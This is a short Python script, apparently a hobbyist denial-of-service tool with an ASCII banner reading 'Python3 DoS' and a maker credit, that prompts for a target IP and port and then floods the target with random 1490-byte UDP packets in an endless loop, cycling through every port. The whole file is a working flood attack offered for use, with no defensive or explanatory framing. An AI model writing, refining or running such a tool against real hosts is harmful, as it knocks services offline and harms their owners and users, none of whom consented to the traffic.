import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system('clear')
print(" ____        _   _                 _____   ____")
print("|  _ \ _   _| |_| |__   ___  _ __ |___ /  |  _ \  ___  ___ ")
print("| |_) | | | | __| '_ \ / _ \| '_ \  |_ \  | | | |/ _ \/ __| ")
print("|  __/| |_| | |_| | | | (_) | | | |___) | | |_| | (_) \__ \ ")
print("|_|    \__, |\__|_| |_|\___/|_| |_|____/  |____/ \___/|___/")
print("       |___/\n")



print("Maker  : Han Yui")
print("Github : https://github.com/Han-seungjae")

ip = input("Target IP : ")
port = int(input("Port       : "))
sent = 0

while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print("Send as many packets as %s , IP: %s Attack Port:%s"%(sent,ip,port))
    if port == 65534:
        port = 1
